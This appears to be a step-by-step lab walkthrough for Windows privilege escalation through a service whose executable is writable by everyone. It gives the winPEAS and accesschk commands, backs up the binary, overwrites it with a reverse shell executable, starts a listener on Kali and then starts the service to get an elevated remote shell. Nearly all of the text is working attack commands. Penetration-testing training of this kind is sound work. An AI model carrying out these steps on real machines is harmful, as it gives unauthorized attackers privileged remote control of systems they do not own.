1.Run winPEAS to check for service misconfigurations:

> .\winPEASany.exe quiet servicesinfo


2.Note that the “filepermsvc” service has an executable which appears to be
writable by everyone. We can confirm this with accesschk.exe:

> .\accesschk.exe /accepteula -quvw "C:\Program
Files\File Permissions Service\filepermservice.exe"


3.Create a backup of the original service executable:
> copy "C:\Program Files\File Permissions
Service\filepermservice.exe" C:\Temp

4.Copy the reverse shell executable to overwrite the service executable:
```
copy /Y C:\PrivEsc\reverse.exe "C:\Program
Files\File Permissions
Service\filepermservice.exe"
```

5.Start a listener on Kali, and then start the service to trigger the
exploit:
> net start filepermsvc
